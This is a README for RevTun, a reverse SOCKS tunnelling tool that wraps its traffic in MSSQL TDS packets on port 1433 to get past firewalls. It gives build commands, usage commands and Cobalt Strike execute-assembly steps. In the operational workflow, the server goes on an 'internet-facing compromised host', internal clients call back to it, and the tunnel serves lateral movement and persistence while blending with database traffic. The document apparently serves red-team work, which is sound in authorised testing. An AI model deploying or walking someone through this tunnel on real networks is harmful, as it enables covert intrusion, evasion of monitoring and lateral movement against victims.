# RevTun - MSSQL Reverse Tunnel

RevTun is a reverse tunneling tool that disguises network traffic as legitimate MSSQL database communications using the Tabular Data Stream (TDS) protocol. This allows for covert network pivoting and firewall evasion by leveraging the commonly trusted MSSQL port 1433.

## How It Works

RevTun operates using a client-server architecture:

1. **Server Component**: Listens on port 1433 (standard MSSQL port) and responds to TDS protocol handshakes
2. **Client Component**: Connects to the server using authentic MSSQL TDS protocol packets
3. **Proxy Activation**: When a client connects, the server automatically activates a SOCKS proxy (default port 1080)
4. **Traffic Tunneling**: All proxy traffic is encapsulated within TDS packets, appearing as legitimate database queries

The result is a fully functional SOCKS proxy that operates through what appears to be normal MSSQL database traffic.

## Prerequisites

### C# Implementation (Primary)
- **.NET 8.0 or later** for cross-platform builds
- **.NET Framework 4.8** for Cobalt Strike compatibility
- No external dependencies required

## Building

### Quick Build (Multi-Platform)
Use the provided PowerShell script for automated builds:

```powershell
# Builds all targets: .NET Framework 4.8, Linux x64, Windows x64
.\build-multi.ps1
```

### Manual Builds

#### Cross-Platform Builds (.NET 8.0)
```bash
# Windows x64 (self-contained single file)
dotnet publish -c Release -f net8.0 -r win-x64 --self-contained true -p:PublishSingleFile=true

# Linux x64 (self-contained single file)
dotnet publish -c Release -f net8.0 -r linux-x64 --self-contained true -p:PublishSingleFile=true
```

#### Cobalt Strike Build (.NET Framework 4.8)
```bash
# Build for execute-assembly compatibility
dotnet build -c Release -f net48 -p:Platform=AnyCPU
```

## Usage

### Basic Server Setup
```bash
# C# Server (recommended)
./revtun server --port 1433 --proxy-port 1080 --verbose
```

### Client Connection
```bash
# Connect to remote server with encryption
./revtun client --host server.example.com --port 1433 --encrypt --verbose
```

## ⚔️ Cobalt Strike Integration

RevTun is optimized for red team operations and Cobalt Strike workflows.

### Deployment Commands

#### Server Deployment (External Host)
```bash
# Deploy server on internet-facing compromised host
execute-assembly revtun.exe server --port 1433 --proxy-port 1080 --require-encryption --verbose
```

#### Client Connection (Internal Host)
```bash
# Connect from internal network back to external server
execute-assembly revtun.exe client --host [external-server-ip] --port 1433 --encrypt
```

### Operational Workflow

1. **Deploy Server**: Use `execute-assembly` to deploy server on external compromised host
2. **Establish Tunnel**: Connect clients from internal networks using reverse connection
3. **Pivot & Lateral Movement**: Use SOCKS proxy for further network access
4. **Maintain Persistence**: TDS traffic blends with legitimate database communications
